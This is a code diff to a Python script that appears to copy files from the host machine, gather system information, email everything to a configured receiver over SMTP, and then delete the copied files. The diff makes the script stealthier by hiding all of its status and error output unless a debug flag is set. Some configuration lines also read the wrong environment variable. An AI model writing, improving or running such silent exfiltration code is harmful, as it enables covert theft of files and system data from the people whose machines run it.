@@ -22,6 +22,8 @@ smtp_port = int(os.getenv("smtp_port", 587))
 max_attachment_size_mb = int(os.getenv("smtp_port", 25))  # Gmail attachment size limit in MB
 max_copy_amount = int(os.getenv("smtp_port", 25)) # Max amount of files to copy in MB
 
+enable_debug_prints = os.getenv("enable_debug_prints", "false").lower()
+
 def get_os_info():
     return platform.platform()
 
@@ -96,10 +98,12 @@ def send_email(sender_email, receiver_email, password, smtp_server, smtp_port, m
         server.starttls()
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
-        print("Email sent successfully!")
+        if enable_debug_prints == "true":
+            print("Email sent successfully!")
         server.quit()
     except Exception as e:
-        print(f"Failed to send email: {e}")
+        if enable_debug_prints == "true":
+            print(f"Failed to send email: {e}")
 
 def send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, subject, system_info_path):
     total_size = 0
@@ -149,7 +153,8 @@ def send_email_with_attachments(sender_email, receiver_email, password, smtp_ser
         send_email(sender_email, receiver_email, password, smtp_server, smtp_port, message)
         email_count += 1
 
-    print(f"Total emails sent: {email_count}")
+    if enable_debug_prints == "true":
+        print(f"Total emails sent: {email_count}")
 
 def prepare_attachments(copied_files_dir):
     attachments = []
@@ -227,12 +232,14 @@ def scrapper():
         # Prepare attachments from copied_files directory
         copied_files_dir = os.path.join(script_dir, 'copied_files')
         system_info_dir =  os.path.join(script_dir, 'system_info.txt')
-        print("Preparing attachments...")
+        if enable_debug_prints == "true":
+            print("Preparing attachments...")
         attachments = prepare_attachments(copied_files_dir)
 
         if not attachments:
             # No attachments to send, just send the system_info.txt
-            print("No attachments found, sending single email with system_info.txt")
+            if enable_debug_prints == "true":
+                print("No attachments found, sending single email with system_info.txt")
             attachments = [{"path": system_info_dir, "size": os.path.getsize(system_info_dir)}]
         
         send_email_with_attachments(sender_email, receiver_email, password, smtp_server, smtp_port, attachments, "System Information Report", system_info_dir)
@@ -246,10 +253,11 @@ def scrapper():
             # Remove copied_files directory and all its contents
             if os.path.exists(copied_files_dir):
                 shutil.rmtree(copied_files_dir)
-            
-            print("Cleanup completed.")
+            if enable_debug_prints == "true":
+                print("Cleanup completed.")
         except Exception as e:
-            print(f"Error during cleanup: {e}")
+            if enable_debug_prints == "true":
+                print(f"Error during cleanup: {e}")
 
 if __name__ == "__main__":
     scrapper()
